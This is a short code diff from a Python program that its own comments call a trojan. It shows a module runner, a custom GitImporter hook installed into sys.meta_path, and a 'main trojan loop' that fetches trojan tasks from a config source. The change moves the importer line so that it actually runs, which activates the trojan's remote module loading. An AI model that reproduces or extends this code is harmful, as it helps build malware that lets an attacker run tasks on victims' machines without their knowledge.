@@ -92,7 +92,7 @@ def module_runner(module):
     store_module_result(result)#store the module resualt
     return#end function
     # main trojan loop
-    sys.meta_path = [GitImporter()]#add my custom importer into path
+sys.meta_path = [GitImporter()]#add my custom importer into path
 while True:#always be active
     if task_queue.empty():#if there are no tasks in task que
         config = get_trojan_config()#get trojan tasks
